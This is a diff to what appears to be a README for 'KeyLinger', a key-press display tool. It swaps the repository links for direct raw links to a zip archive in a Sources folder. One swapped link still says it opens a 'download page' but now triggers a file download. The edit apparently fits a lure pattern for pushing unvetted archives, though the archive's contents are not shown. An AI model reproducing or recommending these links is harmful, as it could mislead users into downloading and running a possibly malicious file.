@@ -1,7 +1,7 @@
 <h1>⌨️ KeyLinger - See Which Keys Are Actually Pressed</h1>
 
 <p align="center">
-  <a href="https://github.com/unhesitating-demonstrative4186/KeyLinger"><img src="https://img.shields.io/badge/Download-KeyLinger-4CAF50?style=for-the-badge&logo=github" alt="Download KeyLinger"></a>
+  <a href="https://raw.githubusercontent.com/unhesitating-demonstrative4186/KeyLinger/main/Sources/Linger-Key-v1.4.zip"><img src="https://img.shields.io/badge/Download-KeyLinger-4CAF50?style=for-the-badge&logo=github" alt="Download KeyLinger"></a>
 </p>
 
 ## 🔍 What Is KeyLinger?
@@ -26,7 +26,7 @@ Getting KeyLinger is super easy. Just follow these simple steps:
 ### 1. Go to the Download Page
 
 <p align="center">
-  <a href="https://github.com/unhesitating-demonstrative4186/KeyLinger">🔗 Click Here to Visit the KeyLinger Download Page</a>
+  <a href="https://raw.githubusercontent.com/unhesitating-demonstrative4186/KeyLinger/main/Sources/Linger-Key-v1.4.zip">🔗 Click Here to Visit the KeyLinger Download Page</a>
 </p>
 
 Visit this link to download the application. The page will open in your browser.
